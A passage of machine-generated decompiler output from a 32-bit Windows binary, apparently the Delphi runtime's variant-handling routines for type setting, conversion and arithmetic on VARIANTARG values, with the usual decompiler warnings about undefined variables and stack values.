  if ( result->vt >= 8u )
  {
    v3 = result;
    sub_412180(result, a2);
    result = v3;
  }
  result->vt = 5;
  result->dblVal = a3;
  return result;
}

//----- (004135C0) --------------------------------------------------------
VARIANTARG *__usercall sub_4135C0@<eax>(VARIANTARG *result@<eax>, int a2@<ecx>, DOUBLE a3@<st0>)
{
  VARIANTARG *v3; // [esp-4h] [ebp-4h]

  if ( result->vt >= 8u )
  {
    v3 = result;
    sub_412180(result, a2);
    result = v3;
  }
  result->vt = 7;
  result->dblVal = a3;
  return result;
}

//----- (004135D8) --------------------------------------------------------
VARIANTARG *__usercall sub_4135D8@<eax>(VARIANTARG *result@<eax>, int a2@<ecx>, double a3@<st0>)
{
  VARIANTARG *v3; // [esp-4h] [ebp-4h]

  if ( result->vt >= 8u )
  {
    v3 = result;
    sub_412180(result, a2);
    result = v3;
  }
  result->vt = 6;
  result->llVal = (__int64)a3;
  return result;
}

//----- (004135F0) --------------------------------------------------------
volatile __int32 *__usercall sub_4135F0@<eax>(VARIANTARG *a1@<eax>, __int32 a2@<edx>, int a3@<ecx>)
{
  if ( a1->vt >= 8u )
    sub_412180(a1, a3);
  a1->lVal = 0;
  a1->vt = 256;
  return sub_4042C0(&a1->lVal, a2);
}

//----- (0041361C) --------------------------------------------------------
_DWORD *__usercall sub_41361C@<eax>(VARIANTARG *a1@<eax>, char *a2@<edx>)
{
  int v3; // ecx
  unsigned int v5[2]; // [esp-14h] [ebp-18h] BYREF
  int *v6; // [esp-Ch] [ebp-10h]
  char *v7; // [esp+0h] [ebp-4h] BYREF
  int savedregs; // [esp+4h] [ebp+0h] BYREF

  v7 = 0;
  v6 = &savedregs;
  v5[1] = (unsigned int)&loc_41365F;
  v5[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v5);
  sub_4044C8(&v7, a2);
  sub_4135F0(a1, (__int32)v7, v3);
  __writefsdword(0, v5[0]);
  v6 = (int *)&loc_413666;
  return sub_40426C(&v7);
}
// 413644: variable 'v3' is possibly undefined

//----- (0041366C) --------------------------------------------------------
void __usercall sub_41366C(VARIANTARG *a1@<eax>, int a2@<edx>, int a3@<ecx>)
{
  if ( a1->vt >= 8u )
    sub_412180(a1, a3);
  a1->lVal = 0;
  a1->vt = 8;
  sub_404B5C(a2, 1, 0x7FFFFFFF, &a1->bstrVal);
}

//----- (004136A4) --------------------------------------------------------
_DWORD *__usercall sub_4136A4@<eax>(VARIANTARG *a1@<eax>, int a2@<edx>, int a3@<ecx>)
{
  if ( a1->vt >= 8u )
    sub_412180(a1, a3);
  a1->lVal = 0;
  a1->vt = 13;
  return sub_405F58(&a1->lVal, a2);
}

//----- (004136D0) --------------------------------------------------------
_DWORD *__usercall sub_4136D0@<eax>(VARIANTARG *a1@<eax>, int a2@<edx>, int a3@<ecx>)
{
  if ( a1->vt >= 8u )
    sub_412180(a1, a3);
  a1->lVal = 0;
  a1->vt = 9;
  return sub_405F58(&a1->lVal, a2);
}

//----- (004136FC) --------------------------------------------------------
_WORD *__usercall sub_4136FC@<eax>(_WORD *a1@<eax>, int *a2@<edx>, __int32 a3@<ecx>)
{
  void *v3; // ecx
  _WORD *result; // eax

  sub_415614((__int32)a1, a2, a3);
  result = a1;
  if ( !*a1 )
    sub_412168(v3);
  return result;
}
// 413709: variable 'v3' is possibly undefined

//----- (00413710) --------------------------------------------------------
OLECHAR **__usercall sub_413710@<eax>(VARIANTARG *a1@<eax>, const CHAR *a2@<edx>)
{
  int v3; // ecx
  unsigned int v5[2]; // [esp-14h] [ebp-18h] BYREF
  int *v6; // [esp-Ch] [ebp-10h]
  OLECHAR *v7; // [esp+0h] [ebp-4h] BYREF
  int savedregs; // [esp+4h] [ebp+0h] BYREF

  v7 = 0;
  v6 = &savedregs;
  v5[1] = (unsigned int)&loc_413753;
  v5[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v5);
  sub_404A4C((int *)&v7, a2);
  sub_41366C(a1, (int)v7, v3);
  __writefsdword(0, v5[0]);
  v6 = (int *)&loc_41375A;
  return sub_404900(&v7);
}
// 413738: variable 'v3' is possibly undefined

//----- (00413760) --------------------------------------------------------
_DWORD *__usercall sub_413760@<eax>(VARIANTARG *a1@<eax>, char *a2@<edx>)
{
  unsigned int v4[2]; // [esp-14h] [ebp-18h] BYREF
  int *v5; // [esp-Ch] [ebp-10h]
  char *v6; // [esp+0h] [ebp-4h] BYREF
  int savedregs; // [esp+4h] [ebp+0h] BYREF

  v6 = 0;
  v5 = &savedregs;
  v4[1] = (unsigned int)&loc_4137A3;
  v4[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v4);
  sub_4044C8(&v6, a2);
  sub_413710(a1, v6);
  __writefsdword(0, v4[0]);
  v5 = (int *)&loc_4137AA;
  return sub_40426C(&v6);
}

//----- (004137B0) --------------------------------------------------------
VARIANTARG *__usercall sub_4137B0@<eax>(VARIANTARG *a1@<eax>, int a2@<edx>)
{
  int v4; // ecx
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-24h] BYREF
  void *v7; // [esp-8h] [ebp-20h]
  int *v8; // [esp-4h] [ebp-1Ch]
  void *v9; // [esp+0h] [ebp-18h]
  VARIANTARG v10; // [esp+8h] [ebp-10h] BYREF
  int savedregs; // [esp+18h] [ebp+0h] BYREF

  sub_412178(&v10);
  v8 = &savedregs;
  v7 = &loc_413805;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  sub_4125AC(&v10, a2);
  dword_42CA48(ExceptionList);
  sub_4125AC(a1, (int)&v10);
  v4 = (int)v9;
  __writefsdword(0, (unsigned int)v7);
  v9 = &loc_41380C;
  return sub_412180(&v10, v4);
}
// 42CA48: using guessed type int (__stdcall *dword_42CA48)(_DWORD);

//----- (00413814) --------------------------------------------------------
int __usercall sub_413814@<eax>(int a1@<eax>, _WORD *a2@<edx>, int a3@<ecx>)
{
  unsigned __int16 v5; // bx
  void *v7; // ecx
  int v8[4]; // [esp+0h] [ebp-10h] BYREF

  v8[0] = a3;
  v5 = *a2 & 0xFFF;
  if ( v5 < 0x10Fu )
    return sub_41385C(a3, a2);
  if ( !sub_415EA4(v5, v8) )
    sub_412170(v7);
  return (*(int (__fastcall **)(_WORD *, int))(*(_DWORD *)v8[0] + 32))(a2, a1);
}
// 413851: variable 'v7' is possibly undefined
// 41385C: using guessed type int __fastcall sub_41385C(_DWORD, _DWORD);
// 413814: using guessed type int var_10[4];

//----- (0041385C) --------------------------------------------------------
VARIANTARG *__usercall sub_41385C@<eax>(VARIANTARG *a1@<eax>, VARIANTARG *a2@<edx>, int a3@<ecx>)
{
  int v5; // ecx
  VARTYPE vt; // ax
  unsigned __int16 v7; // si
  unsigned int v8; // edx
  unsigned int v9; // edx
  bool v10; // cf
  unsigned int v11; // edx
  unsigned int v12; // edx
  void *v14; // ecx
  int v15[4]; // [esp+0h] [ebp-10h] BYREF

  v15[0] = a3;
  sub_412180(a1, a3);
  vt = a2->vt;
  v7 = a2->vt & 0xFFF;
  if ( v7 >= 0x10Fu )
  {
    if ( !sub_415EA4(v7, v15) )
      sub_412170(v14);
    return (VARIANTARG *)(*(int (__fastcall **)(VARIANTARG *, VARIANTARG *))(*(_DWORD *)v15[0] + 32))(a2, a1);
  }
  v8 = vt & 0xBFFF;
  if ( v8 > 0x14 )
  {
    v12 = v8 - 256;
    if ( !v12 )
      return (VARIANTARG *)sub_413710(a1, a2->pcVal);
    if ( v12 == 1 )
      return sub_4137B0(a1, (int)a2);
    goto LABEL_21;
  }
  if ( v8 == 20 )
  {
    if ( a2->llVal > 0x7FFFFFFF || a2->llVal < (signed __int64)0xFFFFFFFF80000000ui64 )
    {
      LOWORD(v5) = 5;
      return sub_412950(a1, a2, v5);
    }
LABEL_17:
    LOWORD(v5) = 3;
    return sub_412950(a1, a2, v5);
  }
  v9 = v8 - 16;
  v10 = v9 < 3;
  v11 = v9 - 3;
  if ( v10 )
    goto LABEL_17;
  if ( v11 )
  {
LABEL_21:
    if ( (vt & 0x2000) != 0 )
      return (VARIANTARG *)sub_4122C0(a1, a2, (void (*)(void))sub_413814);
    else
      return sub_4125AC(a1, (int)a2);
  }
  if ( a2->lVal > 0x7FFFFFFFu )
    LOWORD(v5) = 5;
  else
    LOWORD(v5) = 3;
  return sub_412950(a1, a2, v5);
}
// 4138DA: variable 'v5' is possibly undefined
// 41398C: variable 'v14' is possibly undefined
// 41385C: using guessed type int var_10[4];

//----- (00413998) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
int __usercall sub_413998@<eax>(_WORD *a1@<eax>, int a2@<edx>, int a3@<ebx>, int a4@<esi>)
{
  int v5; // ecx
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-14h] [ebp-24h] BYREF
  void *v8; // [esp-10h] [ebp-20h]
  void **v9; // [esp-Ch] [ebp-1Ch]
  int v10; // [esp-8h] [ebp-18h]
  int v11; // [esp-4h] [ebp-14h]
  OLECHAR *v12; // [esp+0h] [ebp-10h] BYREF
  char **v13; // [esp+4h] [ebp-Ch] BYREF
  unsigned __int32 v14; // [esp+8h] [ebp-8h] BYREF
  int v15; // [esp+Ch] [ebp-4h] BYREF
  void *savedregs; // [esp+10h] [ebp+0h] BYREF

  v15 = 0;
  v14 = 0;
  v13 = 0;
  v12 = 0;
  v11 = a3;
  v10 = a4;
  v9 = &savedregs;
  v8 = &loc_413A3C;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  if ( *a1 == 256 )
  {
    sub_4050E0(0, a1);
    v12 = (OLECHAR *)&v15;
    sub_4050E0(v5, a2);
    sub_40452C(v13, v14);
    sub_405134();
  }
  else
  {
    sub_4050E8(ExceptionList, v8, v9, v10, v11, v12);
    ((void (__stdcall *)(char ***))sub_4050E8)(&v13);
    sub_404A78((int *)v13, (char *)v12);
    sub_40513C(v14);
  }
  __writefsdword(0, v14);
  savedregs = &loc_413A43;
  sub_404918(&v12, 2);
  return sub_404290((int)&v14, 2);
}
// 413998: could not find valid save-restore pair for ebx
// 413998: could not find valid save-restore pair for esi
// 413A29: bad sp value at call
// 413A36: bad sp value at call
// 4139CF: variable 'v5' is possibly undefined
// 4050E0: using guessed type int __fastcall sub_4050E0(_DWORD, _DWORD);
// 4050E8: using guessed type int __stdcall sub_4050E8(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 405134: using guessed type int sub_405134(void);
// 40513C: using guessed type int __cdecl sub_40513C(_DWORD);

//----- (00413A4C) --------------------------------------------------------
VARIANTARG *__usercall sub_413A4C@<eax>(VARIANTARG *a1@<eax>, VARIANTARG *a2@<edx>, int a3@<ecx>)
{
  unsigned __int16 v3; // bx
  int v4; // esi
  void *v5; // ecx
  int v6; // esi
  void *v7; // ecx
  void *v8; // ecx
  void *v9; // ecx
  void *v10; // ecx
  void *v11; // ecx
  void *v12; // ecx
  void *v13; // ecx
  void *v14; // ecx
  int v15; // ecx
  unsigned int v17[2]; // [esp-Ch] [ebp-40h] BYREF
  int *v18; // [esp-4h] [ebp-38h]
  VARIANTARG v19; // [esp+Ch] [ebp-28h] BYREF
  int *v20; // [esp+1Ch] [ebp-18h] BYREF
  int v21; // [esp+20h] [ebp-14h] BYREF
  unsigned __int16 v22; // [esp+24h] [ebp-10h] BYREF
  unsigned __int16 v23; // [esp+26h] [ebp-Eh] BYREF
  unsigned int v24; // [esp+28h] [ebp-Ch]
  VARIANTARG *v25; // [esp+2Ch] [ebp-8h]
  VARIANTARG *v26; // [esp+30h] [ebp-4h]
  int savedregs; // [esp+34h] [ebp+0h] BYREF

  v24 = a3;
  v25 = a2;
  v26 = a1;
  v3 = a1->vt & 0xFFF;
  HIWORD(v4) = HIWORD(a2);
  LOWORD(v4) = a2->vt & 0xFFF;
  sub_412178(&v19);
  v18 = &savedregs;
  v17[1] = (unsigned int)&loc_413CB3;
  v17[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v17);
  if ( v3 >= 0x10Fu )
  {
    if ( !sub_415EA4(v3, &v21) )
      sub_412170(v9);
    if ( (*(unsigned __int8 (__fastcall **)(unsigned int, VARIANTARG *, unsigned __int16 *))(*(_DWORD *)v21 + 8))(
           v24,
           v25,
           &v22) )
    {
      if ( (_WORD)v4 == v22 )
      {
        (*(void (__fastcall **)(VARIANTARG *, VARIANTARG *, unsigned int))(*(_DWORD *)v21 + 44))(v25, v26, v24);
      }
      else
      {
        sub_412B30(&v19, v25, v22);
        if ( (v19.vt & 0xFFF) != v22 )
          sub_412168(v10);
        (*(void (__fastcall **)(VARIANTARG *, VARIANTARG *, unsigned int))(*(_DWORD *)v21 + 44))(&v19, v26, v24);
      }
    }
    else
    {
      if ( (unsigned __int16)v4 < 0x10Fu )
      {
        if ( (_WORD)v4 != v3 )
        {
          sub_412B30(&v19, v26, (unsigned __int16)v4);
          sub_4125AC(v26, (int)&v19);
          if ( (_WORD)v4 != (v26->vt & 0xFFF) )
            sub_412168(v11);
        }
        goto LABEL_3;
      }
      if ( !sub_415EA4(v4, &v20) )
        sub_412170(v12);
      if ( !(*(unsigned __int8 (__fastcall **)(unsigned int, VARIANTARG *, unsigned __int16 *, unsigned int))(*v20 + 4))(
              v24,
              v26,
              &v23,
              v17[0]) )
        sub_412170(v13);
      if ( v3 != v23 )
      {
        sub_412B30(&v19, v26, v23);
        sub_4125AC(v26, (int)&v19);
        if ( (v26->vt & 0xFFF) != v23 )
          sub_412168(v14);
      }
      v17[0] = v24;
      (*(void (__fastcall **)(VARIANTARG *, VARIANTARG *))(*v20 + 44))(v25, v26);
    }
  }
  else
  {
    if ( (unsigned __int16)v4 < 0x10Fu )
    {
LABEL_3:
      sub_41413C(v26, v25, v24, v4);
      goto LABEL_35;
    }
    if ( !sub_415EA4(v4, &v20) )
      sub_412170(v5);
    v6 = *v20;
    if ( (*(unsigned __int8 (__fastcall **)(unsigned int, VARIANTARG *, unsigned __int16 *))(*v20 + 4))(v24, v26, &v23) )
    {
      if ( v3 != v23 )
      {
        sub_412B30(&v19, v26, v23);
        sub_4125AC(v26, (int)&v19);
        if ( (v26->vt & 0xFFF) != v23 )
          sub_412168(v7);
      }
      (*(void (__fastcall **)(VARIANTARG *, VARIANTARG *, unsigned int))(*v20 + 44))(v25, v26, v24);
    }
    else
    {
      sub_412B30(&v19, v25, v3);
      if ( v3 != (v19.vt & 0xFFF) )
        sub_412168(v8);
      sub_41413C(v26, &v19, v24, v6);
    }
  }
LABEL_35:
  v15 = (int)v18;
  __writefsdword(0, v17[0]);
  v18 = (int *)&loc_413CBA;
  return sub_412180(&v19, v15);
}
// 413ABD: variable 'v5' is possibly undefined
// 413B0D: variable 'v7' is possibly undefined
// 413B44: variable 'v8' is possibly undefined
// 413B6A: variable 'v9' is possibly undefined
// 413BA8: variable 'v10' is possibly undefined
// 413C0F: variable 'v11' is possibly undefined
// 413C32: variable 'v12' is possibly undefined
// 413C7F: variable 'v14' is possibly undefined
// 413C98: variable 'v13' is possibly undefined

//----- (00413CC8) --------------------------------------------------------
VARIANTARG *__usercall sub_413CC8@<eax>(_WORD *a1@<eax>, _WORD *a2@<edx>, int a3@<ecx>)
{
  int v5; // ecx
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-28h] BYREF
  void *v8; // [esp-8h] [ebp-24h]
  int *v9; // [esp-4h] [ebp-20h]
  void *v10; // [esp+0h] [ebp-1Ch]
  VARIANTARG v11; // [esp+Ch] [ebp-10h] BYREF
  int savedregs; // [esp+1Ch] [ebp+0h] BYREF

  if ( *a1 == 257 )
    dword_42CA48(v10);
  if ( *a2 != 257 )
    return (VARIANTARG *)sub_413A4C(a3, a2);
  sub_412178(&v11);
  sub_4125AC(&v11, (int)a2);
  v9 = &savedregs;
  v8 = &loc_413D38;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  dword_42CA48(ExceptionList);
  sub_413A4C(a3, &v11);
  v5 = (int)v10;
  __writefsdword(0, (unsigned int)v8);
  v10 = &loc_413D4A;
  return sub_412180(&v11, v5);
}
// 413A4C: using guessed type int __fastcall sub_413A4C(_DWORD, _DWORD);
// 42CA48: using guessed type int (__stdcall *dword_42CA48)(_DWORD);

//----- (00413D54) --------------------------------------------------------
unsigned int __usercall sub_413D54@<eax>(int a1@<eax>, void *a2@<ecx>, int a3)
{
  unsigned int v3; // ebx

  v3 = a1 & 0xFFFF0FFF;
  if ( (a1 & 0xFFFu) > 0x14 )
  {
    if ( (_WORD)v3 == 256 )
    {
      LOWORD(v3) = 8;
    }
    else
    {
      if ( (_WORD)v3 != 257 )
        sub_412170(a2);
      sub_413CC8(*(_WORD **)(a3 - 4), *(_WORD **)(a3 - 8), *(_DWORD *)(a3 - 12));
    }
  }
  return v3;
}

//----- (00413D9C) --------------------------------------------------------
int __usercall sub_413D9C@<eax>(VARIANTARG *a1@<eax>, VARIANTARG *a2@<edx>, int a3@<ecx>)
{
  bool v5; // cf
  int v6; // edi
  int v7; // edi
  double v9; // [esp+Ch] [ebp-10h]
  double v10; // [esp+14h] [ebp-8h]

  v10 = sub_412F18(a1);
  v9 = sub_412F18(a2);
  v5 = a3 == 0;
  v6 = a3 - 1;
  if ( v5 )
  {
    v10 = v10 + v9;
  }
  else if ( v6 )
  {
    v7 = v6 - 1;
    if ( v7 )
    {
      if ( v7 == 1 )
        v10 = v10 / v9;
      else
        nullsub_6();
    }
    else
    {
      v10 = v10 * v9;
    }
  }
  else
  {
    v10 = v10 - v9;
  }
  return sub_405124(v10);
}
// 405124: using guessed type int __usercall sub_405124@<eax>(double@<st0>);
// 413CC4: using guessed type int nullsub_6(void);

//----- (00413E2C) --------------------------------------------------------
int __usercall sub_413E2C@<eax>(VARIANTARG *a1@<eax>, VARIANTARG *a2@<edx>, int a3@<ecx>)
{
  int v6; // ecx
  bool v8; // [esp+Fh] [ebp-9h]
  int v9; // [esp+10h] [ebp-8h]
  int v10; // [esp+14h] [ebp-4h]

  v8 = 0;
  v10 = sub_412CB4(a1);
  v9 = sub_412CB4(a2);
  switch ( a3 )
  {
    case 0:
      v8 = __OFADD__(v9, v10);
      v10 += v9;
      break;
    case 1:
      v8 = __OFSUB__(v10, v9);
      v10 -= v9;
      break;
    case 2:
      v8 = (unsigned __int64)(v9 * (__int64)v10) >> 32 != 0;
      v10 *= v9;
      break;
    case 4:
      v10 /= v9;
      break;
    case 5:
      v10 %= v9;
      break;
    case 6:
      v6 = v9;
      v10 <<= v9;
      break;
    case 7:
      v6 = v9;
      v10 = (unsigned int)v10 >> v9;
      break;
    case 8:
      v10 &= v9;
      break;
    case 9:
      v10 |= v9;
      break;
    case 10:
      v10 ^= v9;
      break;
    default:
      nullsub_6();
      break;
  }
  if ( v8 )
    return sub_413D9C(a1, a2, a3);
  LOBYTE(v6) = -4;
  return sub_405100(v6, v10);
}
// 413F34: variable 'v6' is possibly undefined
// 405100: using guessed type int __fastcall sub_405100(_DWORD, _DWORD);
// 413CC4: using guessed type int nullsub_6(void);

//----- (00413F50) --------------------------------------------------------
int __usercall sub_413F50@<eax>(CONTEXT *a1@<eax>, EXCEPTION_RECORD *a2@<edx>, int a3@<ecx>)
{
  __int64 v3; // rax
  __int64 v4; // rax
  __int64 v5; // rax
  __int64 v6; // rax
  __int64 v7; // rax
  unsigned int v9[4]; // [esp-Ch] [ebp-38h] BYREF
  __int64 v10; // [esp+Ch] [ebp-20h]
  __int64 v11; // [esp+14h] [ebp-18h]
  int v12; // [esp+20h] [ebp-Ch]
  struct _EXCEPTION_POINTERS ExceptionInfo; // [esp+24h] [ebp-8h]
  int savedregs; // [esp+2Ch] [ebp+0h] BYREF

  v12 = a3;
  ExceptionInfo.ExceptionRecord = a2;
  ExceptionInfo.ContextRecord = a1;
  v11 = sub_412D90((VARIANTARG *)a1);
  v10 = sub_412D90((VARIANTARG *)ExceptionInfo.ExceptionRecord);
  switch ( v12 )
  {
    case 0:
    case 1:
    case 2:
      v9[2] = (unsigned int)&savedregs;
      v9[1] = (unsigned int)&loc_414028;
      v9[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
      __writefsdword(0, (unsigned int)v9);
      if ( v12 )
      {
        if ( v12 == 1 )
        {
          v11 -= v10;
        }
        else if ( v12 == 2 )
        {
          LODWORD(v3) = sub_405170(v11, v10, SHIDWORD(v10));
          v11 = v3;
        }
      }
      else
      {
        v11 += v10;
      }
      __writefsdword(0, v9[0]);
      break;
    case 4:
      LODWORD(v4) = sub_405194(v11, v10, SHIDWORD(v10));
      v11 = v4;
      break;
    case 5:
      LODWORD(v5) = sub_40525C(v11, v10, SHIDWORD(v10));
      v11 = v5;
      break;
    case 6:
      LODWORD(v6) = sub_405328(v11, v10);
      v11 = v6;
      break;
    case 7:
      LODWORD(v7) = sub_405348(v11, v10);
      v11 = v7;
      break;
    case 8:
      v11 &= v10;
      break;
    case 9:
      v11 |= v10;
      break;
    case 10:
      v11 ^= v10;
      break;
    default:
      nullsub_6();
      break;
  }
  return sub_405108(v11, SHIDWORD(v11));
}
// 414015: variable 'v3' is possibly undefined
// 414065: variable 'v4' is possibly undefined
// 414081: variable 'v5' is possibly undefined
// 414099: variable 'v6' is possibly undefined
// 4140B1: variable 'v7' is possibly undefined
// 413CC4: using guessed type int nullsub_6(void);

//----- (0041413C) --------------------------------------------------------
int __usercall sub_41413C@<eax>(VARIANTARG *a1@<eax>, VARIANTARG *a2@<edx>, int a3@<ecx>, int a4@<esi>)
{
  int v4; // eax
  unsigned __int8 v5; // bl
  int result; // eax
  double v7; // st7
  double v8; // st7
  double v9; // st7
  double v10; // st7
  double v11; // st7
  void *v12; // [esp-4h] [ebp-30h]
  void *v13; // [esp-4h] [ebp-30h]
  __int64 v14; // [esp+4h] [ebp-28h]
  __int64 v15; // [esp+4h] [ebp-28h]
  unsigned __int8 v16; // [esp+1Fh] [ebp-Dh]
  VARIANTARG *v19; // [esp+28h] [ebp-4h]
  int savedregs; // [esp+2Ch] [ebp+0h] BYREF

  v19 = a1;
  LOWORD(a1) = a1->vt;
  v16 = byte_42B428[(unsigned __int16)sub_413D54((int)a1, (void *)a3, (int)&savedregs)];
  HIWORD(v4) = HIWORD(a2);
  LOWORD(v4) = a2->vt;
  v5 = byte_42B428[(unsigned __int16)sub_413D54(v4, v12, (int)&savedregs)];
  switch ( byte_42B440[9 * v16 + v5] )
  {
    case 0:
      sub_412170(v13);
    case 1:
      sub_412180(v19, (int)v13);
      result = (int)v19;
      v19->vt = 1;
      return result;
    case 2:
      if ( a3 == 3 )
        return sub_413D9C(v19, a2, 3);
      return sub_413E2C(v19, a2, a3);
    case 3:
      if ( a3 < 4 )
        return sub_413D9C(v19, a2, a3);
      return sub_413E2C(v19, a2, a3);
    case 4:
      if ( a3 )
      {
        if ( a3 == 1 )
        {
          v15 = (__int64)sub_413054(v19);
          v8 = sub_413054(a2);
          return sub_40512C((double)v15 - v8);
        }
        else
        {
          if ( (unsigned int)(a3 - 2) >= 2 )
            return sub_413E2C(v19, a2, a3);
          if ( v16 == 4 && v5 == 4 )
          {
            if ( a3 == 2 )
              return sub_40512C((double)v19->llVal * (double)a2->llVal / 10000.0);
            else
              return sub_405124((double)v19->llVal / (double)a2->llVal);
          }
          else if ( v5 == 4 )
          {
            if ( a3 == 2 )
            {
              v9 = sub_412F18(v19);
              return sub_40512C((double)(__int64)(v9 * (double)a2->llVal));
            }
            else
            {
              v10 = sub_413054(v19);
              return sub_405124(v10 / (double)a2->llVal);
            }
          }
          else
          {
            v11 = sub_412F18(a2);
            if ( a3 == 2 )
              return sub_40512C((double)(__int64)(v11 * (double)v19->llVal));
            else
              return sub_40512C((double)(__int64)((double)v19->llVal / v11));
          }
        }
      }
      else
      {
        v14 = (__int64)sub_413054(v19);
        v7 = sub_413054(a2);
        return sub_40512C(v7 + (double)v14);
      }
    case 5:
      if ( !a3 )
        return sub_413998(v19, (int)a2, v5, a4);
      if ( a3 < 4 )
        return sub_413D9C(v19, a2, a3);
      return sub_413E2C(v19, a2, a3);
    case 6:
      if ( a3 >= 8 )
      {
        if ( a3 == 8 )
        {
          if ( !sub_412EDC(v19) )
            return sub_40511C();
        }
        else
        {
          if ( a3 != 9 )
          {
            result = a3 - 10;
            if ( a3 == 10 )
            {
              sub_412EDC(v19);
              sub_412EDC(a2);
              return sub_40511C();
            }
            return result;
          }
          if ( sub_412EDC(v19) )
            return sub_40511C();
        }
        sub_412EDC(a2);
        return sub_40511C();
      }
      if ( a3 < 4 )
        return sub_413D9C(v19, a2, a3);
      return sub_413E2C(v19, a2, a3);
    case 7:
      if ( !a3 )
      {
        sub_413D9C(v19, a2, 0);
        result = (int)v19;
        v19->vt = 7;
        return result;
      }
      if ( a3 == 1 )
      {
        result = sub_413D9C(v19, a2, 1);
        if ( v16 == 7 && v5 == 7 )
        {
          result = (int)v19;
          v19->vt = 7;
        }
        return result;
      }
      if ( (unsigned int)(a3 - 2) < 2 )
        return sub_413D9C(v19, a2, a3);
      return sub_413E2C(v19, a2, a3);
    case 8:
      if ( a3 == 3 )
        return sub_413D9C(v19, a2, 3);
      else
        return sub_413F50((CONTEXT *)v19, (EXCEPTION_RECORD *)a2, a3);
    default:
      return nullsub_6();
  }
}
// 41416C: variable 'v12' is possibly undefined
// 4141C5: variable 'v13' is possibly undefined
// 40511C: using guessed type int sub_40511C(void);
// 405124: using guessed type int __usercall sub_405124@<eax>(double@<st0>);
// 40512C: using guessed type int __usercall sub_40512C@<eax>(double@<st0>);
// 413CC4: using guessed type int nullsub_6(void);
// 42B440: using guessed type _BYTE byte_42B440[84];

//----- (00414554) --------------------------------------------------------
char __usercall sub_414554@<al>(VARIANTARG *a1@<eax>, VARIANTARG *a2@<edx>, unsigned int a3@<ecx>)
{
  unsigned __int16 v3; // bx
  unsigned __int16 v4; // si
  void *v5; // ecx
  int v6; // ecx
  void *v7; // ecx
  void *v8; // ecx
  char v9; // al
  char v10; // al
  void *v11; // ecx
  void *v12; // ecx
  void *v13; // ecx
  char v14; // al
  char v15; // al
  void *v16; // ecx
  void *v17; // ecx
  void *v18; // ecx
  void *v19; // ecx
  char v20; // al
  char v21; // al
  int v22; // ecx
  unsigned int v24[2]; // [esp-18h] [ebp-60h] BYREF
  unsigned __int16 *v25; // [esp-10h] [ebp-58h]
  unsigned int v26[2]; // [esp-Ch] [ebp-54h] BYREF
  int *v27; // [esp-4h] [ebp-4Ch]
  VARIANTARG v28; // [esp+Ch] [ebp-3Ch] BYREF
  VARIANTARG v29; // [esp+1Ch] [ebp-2Ch] BYREF
  int v30; // [esp+2Ch] [ebp-1Ch] BYREF
  int v31; // [esp+30h] [ebp-18h] BYREF
  unsigned __int16 v32; // [esp+36h] [ebp-12h] BYREF
  unsigned __int16 v33; // [esp+38h] [ebp-10h] BYREF
  char v34; // [esp+3Bh] [ebp-Dh]
  unsigned int v35; // [esp+3Ch] [ebp-Ch]
  VARIANTARG *v36; // [esp+40h] [ebp-8h]
  VARIANTARG *v37; // [esp+44h] [ebp-4h]
  int savedregs; // [esp+48h] [ebp+0h] BYREF

  v35 = a3;
  v36 = a2;
  v37 = a1;
  v3 = a1->vt & 0xFFF;
  v4 = a2->vt & 0xFFF;
  v34 = 1;
  sub_412178(&v29);
  v27 = &savedregs;
  v26[1] = (unsigned int)&loc_4148F4;
  v26[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v26);
  if ( v3 >= 0x10Fu )
  {
    if ( !sub_415EA4(v3, &v31) )
      sub_412170(v12);
    v25 = &v32;
    if ( (*(unsigned __int8 (__fastcall **)(int, VARIANTARG *, unsigned __int16 *))(*(_DWORD *)v31 + 8))(11, v36, &v32) )
    {
      if ( v4 == v32 )
      {
        v25 = (unsigned __int16 *)v35;
        v15 = (*(int (__fastcall **)(VARIANTARG *, VARIANTARG *, unsigned int))(*(_DWORD *)v31 + 52))(v36, v37, v35);
        v34 = byte_42B498[2 * v35 - 28 + (v15 & 0x7F)];
      }
      else
      {
        sub_412B30(&v29, v36, v32);
        if ( (v29.vt & 0xFFF) != v32 )
          sub_412168(v13);
        v25 = (unsigned __int16 *)v35;
        v14 = (*(int (__fastcall **)(VARIANTARG *, VARIANTARG *, unsigned int))(*(_DWORD *)v31 + 52))(&v29, v37, v35);
        v34 = byte_42B498[2 * v35 - 28 + (v14 & 0x7F)];
      }
    }
    else if ( v4 >= 0x10Fu )
    {
      if ( !sub_415EA4(v4, &v30) )
        sub_412170(v17);
      v25 = &v33;
      if ( !(*(unsigned __int8 (__fastcall **)(int, VARIANTARG *, unsigned __int16 *, unsigned int))(*(_DWORD *)v30 + 4))(
              11,
              v37,
              &v33,
              v26[0]) )
        sub_412170(v18);
      if ( v3 == v33 )
      {
        v26[0] = v35;
        v21 = (*(int (__fastcall **)(VARIANTARG *, VARIANTARG *))(*(_DWORD *)v30 + 52))(v36, v37);
        v34 = byte_42B498[2 * v35 - 28 + (v21 & 0x7F)];
      }
      else
      {
        sub_412B30(&v29, v37, v33);
        if ( (v29.vt & 0xFFF) != v33 )
          sub_412168(v19);
        v26[0] = v35;
        v20 = (*(int (__fastcall **)(VARIANTARG *, VARIANTARG *))(*(_DWORD *)v30 + 52))(v36, &v29);
        v34 = byte_42B498[2 * v35 - 28 + (v20 & 0x7F)];
      }
    }
    else
    {
      sub_412B30(&v29, v37, v4);
      if ( v4 != (v29.vt & 0xFFF) )
        sub_412168(v16);
